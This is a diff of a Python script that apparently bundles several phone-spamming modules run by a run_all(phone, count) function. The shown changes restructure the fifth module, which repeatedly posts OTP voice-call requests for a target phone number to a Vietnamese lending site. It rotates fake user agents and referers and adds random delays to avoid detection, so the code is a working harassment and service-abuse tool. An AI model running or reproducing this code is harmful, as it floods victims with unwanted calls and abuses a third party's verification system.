@@ -2424,12 +2424,12 @@ def main_4():
 # ============================================================
 # FILE 5
 # ============================================================
-import subprocess
-import sys
-import os
-
-def install_packages():
 def main_5():
+    import subprocess
+    import sys
+    import os
+
+    def install_packages():
         packages = ['requests', 'fake-useragent']
         for package in packages:
             try:
@@ -2483,7 +2483,7 @@ def main_5():
         try:
             random_ua = ua.random
             random_referer = random.choice(referers)
-        
+
             headers = {
                 'accept': '*/*',
                 'accept-language': 'vi-VN,en-US;q=0.9,en;q=0.8',
@@ -2498,7 +2498,7 @@ def main_5():
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin'
             }
-        
+
             payload = {
                 "data": {
                     "phone": phone,
@@ -2506,9 +2506,9 @@ def main_5():
                     "channel": "ivr"
                 }
             }
-        
+
             session = requests.Session()
-        
+
             session.get(
                 f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7&utm_source=direct_vayxanh&utm_medium=organic&utm_campaign=direct_vayxanh&utm_content=mainpage_submit',
                 headers={
@@ -2523,16 +2523,16 @@ def main_5():
                 },
                 timeout=10
             )
-        
+
             time.sleep(random.uniform(0.1, 0.5))
-        
+
             response = session.post(
                 'https://lk.vayxanh.com/internal/client/otp/send',
                 headers=headers,
                 json=payload,
                 timeout=10
             )
-        
+
             if response.status_code == 200:
                 print(f"\033[92m[{i}/{count}] ✓ Gửi yêu cầu gọi thành công\033[0m")
                 print(f"\033[90m    → UA: {random_ua[:40]}...\033[0m")
@@ -2553,12 +2553,12 @@ def main_5():
                 print(f"\033[91m[{i}/{count}] ✗ Lỗi: HTTP {response.status_code}\033[0m")
                 if response.text:
                     print(f"    → {response.text[:150]}")
-        
+
             if i < count:
                 delay = random.uniform(0, 1)
                 print(f"\033[90m    → Đợi {delay:.1f}s\033[0m")
                 time.sleep(delay)
-            
+
         except requests.exceptions.Timeout:
             print(f"\033[91m[{i}/{count}] ✗ Timeout - Đang thử lại...\033[0m")
             time.sleep(random.uniform(0, 1))
@@ -10726,7 +10726,6 @@ def run_all(phone, count):
                     results[file_num] = "❌ Khong tim thay main"
                     return
                 
-                # Check if it's async
                 import inspect
                 if inspect.iscoroutinefunction(main_func):
                     asyncio.run(main_func())
